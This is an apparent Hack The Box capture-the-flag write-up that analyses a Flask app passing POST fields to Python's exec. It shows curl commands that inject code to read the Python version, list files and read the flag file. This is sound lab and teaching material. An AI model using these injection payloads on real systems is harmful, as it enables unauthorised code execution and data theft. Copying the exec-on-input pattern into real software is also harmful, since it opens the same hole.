## [Baby Interdimensional Internet](https://app.hackthebox.com/challenges/147)

The target web application's index page shows a retro-esque photo of Rick Sanchez and Morty Smith from [Rick and Morty](https://en.wikipedia.org/wiki/Rick_and_Morty) along with a new integer on each load. The integer appears to be completely random, unrelated to any data from the request.

![](images/Pasted%20image%2020220313152253.png)

The page's source code contains a comment that discloses another route, `/debug`.

![](images/Pasted%20image%2020220313152427.png)

`/debug` returns the application's source code. It is a Flask application.

There are only two routes: `/` and `/debug`.

A `GET` request to `/` results in the generation of a random, 10-character string whose value is assigned to the `ingredient` variable. It then generates a random mathematical expression. The `ingredient` variable and the mathematical expression are interpolated into the `recipe` string in the format `ingredient = expression`. `recipe` is then passed into Python's [exec](https://docs.python.org/3.1/library/functions.html?highlight=exec#exec) function, which interprets and executes the string as Python code. The variable whose name is the value of the `ingredient` variable is then rendered to the user.

A `POST` request to `/` follow a similar algorithm, except `ingredient` and the mathematical expression (here called `measurements`) are read from the `POST` body. 

```python
from flask import Flask, Response, request, render_template, request
from random import choice, randint
from string import lowercase
from functools import wraps

app = Flask(__name__)

def calc(recipe):
	global garage
	garage = {}
	try: exec(recipe, garage)
	except: pass

def GCR(func): # Great Calculator of the observable universe and it's infinite timelines
	@wraps(func)
	def federation(*args, **kwargs):
		ingredient = ''.join(choice(lowercase) for _ in range(10))
		recipe = '%s = %s' % (ingredient, ''.join(map(str, [randint(1, 69), choice(['+', '-', '*']), randint(1,69)])))

		if request.method == 'POST':
			ingredient = request.form.get('ingredient', '')
			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))

		calc(recipe)

		if garage.get(ingredient, ''):
			return render_template('index.html', calculations=garage[ingredient])

		return func(*args, **kwargs)
	return federation

@app.route('/', methods=['GET', 'POST'])
@GCR
def index():
	return render_template('index.html')

@app.route('/debug')
def debug():
	return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
	app.run('0.0.0.0', port=1337)
```

This is vulnerable to code injection, as an attacker can define a `measurements` value that executes arbitrary Python code. If the attacker assigns the output of their command to the same variable whose name is the value of the `ingredients` variable, then the output will be rendered to the user.

Inject code to output `sys.version`, determining the application's Python version is 2.7.17.

```bash
$ curl -s -X POST http://64.227.34.91:30418/ -d 'ingredient=blah&measurements=2*2; import sys; blah = sys.version' | grep text-shadow | cut -d'>' -f2
2.7.17 (default, Jan 24 2020, 15:43:24)
```

Inject code to list the application's current directory. After decoding the HTML entities, the application's current directory contains `templates/`, `flag`, and `app.py`.

```bash
$ curl -s -X POST http://64.227.34.91:30418/ -d 'ingredient=blah&measurements=2*2; import os; blah = os.listdir(".")' | grep text-shadow | cut -d'>' -f2
[&#39;templates&#39;, &#39;flag&#39;, &#39;app.py&#39;]</h1
```

Read `flag`.

```bash
$ curl -s -X POST http://64.227.34.91:30418/ -d 'ingredient=blah&measurements=open("flag").read()' | grep text-shadow | cut -d'>' -f2
HTB{n3v3r...}
```
